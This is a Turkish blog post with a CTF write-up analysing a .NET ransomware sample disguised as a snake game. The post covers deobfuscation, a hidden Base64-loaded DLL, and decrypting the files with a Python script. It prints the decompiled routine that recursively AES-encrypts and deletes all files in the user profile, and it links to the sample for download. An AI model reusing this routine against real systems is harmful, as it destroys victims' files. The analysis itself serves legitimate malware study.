---
title: "SnakeGame Ransomware Analizi"
layout: post
---


SnakeGame.exe Dosyasının Statik ve Dinamik Analizi



#### Dosya Bilgileri

Sabancı Üniversitesi Siber Güvenlik Kulubü tarafından düzenelen SUCTF etkinliğinde yer alan Malware ( Dolanan Kobra )  sorusunun Write-Up'ını içermektedir.
Dosyanın Statik ve Dinamik olarak analiz edilerek çözümlenmesi sağlanmıştır.

File olarak uygulamayı incelediğimizde dosya bilgileri aşağıda ki gibidir :

```
Snake_Game.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

#### DIE İncelemesi

Dosya PE incelemesi aşağıda görülmektedir.Ayrıca incelenmeye karşı olarak .NET Reactor ile korunduğunu tespit edebiliriz.C# ile programlanan bu zararlı yazılımı ilk önce davranışlarını
tespit edebilmek için dinamik olarak incelememiz gerekmektedir.Daha sonra buna göre daha geniş çerçevede araştırmalarımza devam edebiliriz.

```js
Koruyucu: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar]
Kütüphane: .NET(v4.0.30319)[-]
Bağlayıcı: Microsoft Linker(48.0)[GUI32]
```
### Dinamik Analiz

Zararlı yazılım çalıştırıldığında cihazda bulunan dosyaların uzantısını `.ENC` olarak değiştirilip hepsinin şifrelendiğini gözlemekteyiz.
Seri bir şekilde şifrelenen dosyalara erişim tamamen kaybolmaktadır ve sistemde ayrıca bazı kritik dosyalarında şifrelenmesi sebebiyle işlevsiz hale gelmektedir.
`WriteFile` fonksiyonu kullanılarak dosyalarda yazma işlemi gerçekleştirilmiştir.

![folder_s3](/img/SnakeGame/ransomsnake2.png)

Registry bilgilerine erişimde `RegQueryValue,RegOpenKey` gibi Operation olarak aktivite tespit edilmiştir.
`HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\Defaults\Provider\Microsoft Enhanced RSA and AES Cryptographic`

Bu bilgilerden yola çıkarak şifreleme fonksiyonunun AES veya RSA olduğu söylenebilir.Tam olarak analiz edildikten sonra kesin bir sonuca varabiliriz.

`Users\%USERNAME%\AppData\Local\Google\Chrome` tarayıcı erişimlerinde bir takım faaliyetler gözlenmiştir.Bu kısım derinlemesine incelenmesede tarayıcıdaki hassas verilere erişim gözlemlenmiştir.

Kriptoloji ile alakalı bazı dizeler görülmektedi.Bunlar aşağıda sıralanmıştır.

```js
RSACryptoServiceProvider
AesCryptoServiceProvider
FromBase64String
MD5CryptoServiceProvider
CryptoStreamMode
System.Security.Cryptography.AesCryptoServiceProvider
```

Program yürütüldüğünde hızlı bir şekilde şifreleme işlemi gerçeklemeye başlamıştır.

![folder_s3](/img/SnakeGame/ransomsnake.gif)

### Statik Analiz

Verilerin .Net Reactor olarak Obfuscation edildiği yani kurcalanmaya karşı işlemler yapıldığını tespit etmiştik.Bu tekniği ise .Net Reactor Slayer ile Deobfuscate edebiliriz.

![folder_s3](/img/SnakeGame/ReactorDeob.png)

Bu işlemi başarı ile gerçekleştirdikten sonra dnSPY gibi araçlarla analizlerimize daha güzel bir şekilde devam edebiliriz.

Kriptolojik faaliyetler

```js
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━
┃Functions or Strings about Cryptography  ┃ Address  ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━┩
│            CryptoStreamMode             │ 0x1b33a8 │
│              CryptoStream               │ 0x1b33a8 │
│              CryptoStream               │ 0x1b3ac2 │
│      System.Security.Cryptography       │ 0x1b43a7 │
│            FromBase64String             │ 0x1b3907 │
│           SymmetricAlgorithm            │ 0x1b3b5b │
│                 set_Key                 │ 0x1b439f │
│               CipherMode                │ 0x1b33b9 │
│             CreateEncryptor             │ 0x1b3f15 │
│             CreateDecryptor             │ 0x1b3f05 │
│            ICryptoTransform             │ 0x1b3b8d │
│             ToBase64String              │ 0x1b3918 │
│                Hashtable                │ 0x1b3415 │
│        AesCryptoServiceProvider         │ 0x1b3df3 │
│        MD5CryptoServiceProvider         │ 0x1b3dc1 │
│              CryptoConfig               │ 0x1b38d7 │
│              HashAlgorithm              │ 0x1b2c94 │
│              HashAlgorithm              │ 0x1b3b6e │
│        RSACryptoServiceProvider         │ 0x1b3dda │
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━
```

Dosyanın kaynak koduna erişim ile alakalı çalışmalarda bazı verilere erişim edilmiştir.

```C#
public Form1()
{
new ResourceManager("Snake_Game.Properties.Resources", Assembly.GetExecutingAssembly());
Type type = Assembly.Load(Convert.FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAA.....")
}
```

public class Form1'da İlk satır, bir ResourceManager nesnesi oluşturur. \
`Snake_Game.Properties.Resources` dizesi, proje içindeki kaynaklara (örneğin resimler, metin dosyaları vb.) erişmek için bir yol belirtir. \
İkinci parametre olarak `Assembly.GetExecutingAssembly()` kullanarak, mevcut yürütülebilir assembly'e erişim sağlar.\
İkinci satır, bir Type nesnesi oluşturur. `Assembly.Load()` metodu, belirtilen bağımlılığı yükler. \
`Convert.FromBase64String()` metodu, bir Base64 kodlanmış diziyi bir byte dizisine dönüştürür. \
Bu, ikinci parametre olarak gelen string'in Base64 kodunu çözüp, onu bir byte dizisine dönüştürür. \
Bu byte dizisi, yürütülebilir bir dosyanın içeriğini temsil eder. Bu şekilde, yürütülebilir bir dosyanın içeriğini belleğe yükleyebilir ve ardından bu dosyanın içindeki türleri inceleyebilirsiniz.

Daha sonra Base64 veri Decode işlemi gerçekleştirilir. `base64 message.txt -d > DropFile`

Dosya incelendiğinde ise `DropFile: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections` tespit edilmektedir.

Oyunla alakalı Kod Bloklarını incelediğimizde ise ;

`internal class Snake`de ise oyun ile alakalı Yukarı , Aşağı , Sağ , Sol gibi oynama ile alakalı fonksiyonlara rastlanmıştır.
Program ilk çalıştırdığımızda herhangi bir şekilde oyunu oynamıyoruz direkt olarak zararlı yazılım sisteme enjekte olmaktadır.
Burada yer alan kaynak kodu alınarak oyun oynanabilir tabiki fakat şuan odak noktamız oyun olmadığı için bunu 

```c#
public void Up()
		{
			this.Follow();
			Point[] location = this.Location;
			int num = 0;
			int y = location[num].Y;
			location[num].Y = y - 1;
			if (this.Location[0].Y < 0)
			{
				Point[] location2 = this.Location;
				int num2 = 0;
				location2[num2].Y = location2[num2].Y + 24;
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000030D4 File Offset: 0x000012D4
		public void Down()
		{
			this.Follow();
			Point[] location = this.Location;
			int num = 0;
			int y = location[num].Y;
			location[num].Y = y + 1;
			if (this.Location[0].Y > 24)
			{
				Point[] location2 = this.Location;
				int num2 = 0;
				location2[num2].Y = location2[num2].Y - 27;
			}
		}
```

DropFile.exe incelediğimizde aynı şekilde .NET Reactor ile Obfuscation yapıldığı gözlemlenerek çözme işlemleri tekrar edilmiştir.

`public class Class1` incelemeye alınmıştır.Burada `AesCryptoServiceProvider` rastlanılmıştır ve şifreleme işlemini yapıldığı bölümü incelemeye almaktayız.

```c#
namespace Liblib
{
	// Token: 0x02000002 RID: 2
	public class Class1
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000024BC File Offset: 0x000006BC
		private void method_0(string string_0)
		{
			foreach (string text in Directory.GetFileSystemEntries(string_0))
			{
				try
				{
					AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
					aesCryptoServiceProvider.Key = Encoding.UTF8.GetBytes("18965d524dd89173121d144428fb0956");
					aesCryptoServiceProvider.Mode = CipherMode.CBC;
					aesCryptoServiceProvider.GenerateIV();
					ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
					if (Directory.Exists(text))
					{
						this.method_0(text);
					}
					byte[] array = File.ReadAllBytes(text);
					byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length).Concat(aesCryptoServiceProvider.IV).ToArray<byte>();
					File.WriteAllBytes(text + ".enc", bytes);
					File.Delete(text);
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000025A4 File Offset: 0x000007A4
		public void GetText()
		{
			this.method_0(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
		}
	}
}
```

`Directory.GetFileSystemEntries(string_0)` Belirtilen dizindeki tüm dosya ve dizinlerin bir listesini alır. \
`foreach (string text in Directory.GetFileSystemEntries(string_0))` Bu döngü, belirtilen dizindeki her dosya ve dizin için işlem yapar. \
`aesCryptoServiceProvider.Key` AES Şifreleme anahtarıdır. \
 Şifreleme modu AES-CBC  olarak belirlenmiştir. `aesCryptoServiceProvider.Mode = CipherMode.CBC`
 
### IV İşleyiş Biçimi 

```c# 
byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length).Concat(aesCryptoServiceProvider.IV).ToArray<byte>();
```

Burada, `TransformFinalBlock` metodu, verilen girdi verisini şifreler ve şifrelenmiş veriyi döndürür. 

Daha sonra, `aesCryptoServiceProvider`.IV ifadesi, kullanılan IV'yi temsil eder ve bu IV, şifrelenmiş verinin sonuna eklenir. Son olarak, `Concat ve ToArray` metodları kullanılarak şifrelenmiş veriyle IV birleştirilir ve yeni bir byte dizisi oluşturulur.

Bu nedenle, IV'in şifrelenmiş verinin sonuna eklenmesi bu satırda gerçekleşiyor.

`File.WriteAllBytes(text + ".enc", bytes)` Şifrelenmiş veri, orijinal dosyanın adına .enc uzantısı eklenmiş yeni bir dosyaya yazılıyor. Böylece orijinal dosyanın içeriği şifrelenmiş oluyor ve .enc uzantılı yeni dosya adı ile saklanıyor. \
`File.Delete(text);` Orijinal dosya siliniyor. Bu adım, orijinal dosyanın şifrelenmiş bir kopyasının oluşturulduğundan ve artık orijinal dosyanın gizli içeriğinin korunmasının önemli olmadığından emin olmak için yapılıyor olabilir.

### Şifrelenmiş Dosyaların Çözümlenmesi 

```py
from Crypto.Cipher import AES
import os

def decrypt_file(file_path, key):
    # Anahtarın uzunluğunu kontrol edelim, 32 byte (256 bit) olmalıdır
    if len(key) != 32:
        print("Hata: Anahtarın uzunluğu 32 byte olmalıdır.")
        return

    # Dosya adını ve uzantısını ayıralım
    file_name, file_ext = os.path.splitext(file_path)
    if file_ext != '.enc':
        print("Hata: Dosya .enc uzantılı olmalıdır.")
        return

    # Dosyanın içeriğini okuyalım
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()

    # Dosyanın son 16 byte'ı IV'dir, geri kalanı şifrelenmiş veridir
    iv = encrypted_data[-16:]
    ciphertext = encrypted_data[:-16]

    # AES şifreleme nesnesi oluşturalım
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Şifreli veriyi çözelim
    decrypted_data = cipher.decrypt(ciphertext)

    # Dolgu byte'larını kaldıralım
    decrypted_data = decrypted_data.rstrip(b'\0')

    # Çözülmüş veriyi yazalım
    with open(file_name + "_decrypted.txt", 'wb') as f:
        f.write(decrypted_data)

# Anahtar
key = b'18965d524dd89173121d144428fb0956'

# Dosya yolu
file_path = 'flag.txt.enc'

# Dosyayı çözelim
decrypt_file(file_path, key)
```

### Final 

```sh
python3 Kobra.py ; cat flag.txt_decrypted.txt
SUCTF{Just_Wanted_To_Play_a_Game_:(}
```

[> Snake_Game.exe İndirmek İçin < ](https://cagrieser.com/postfiles/Snake_Game)


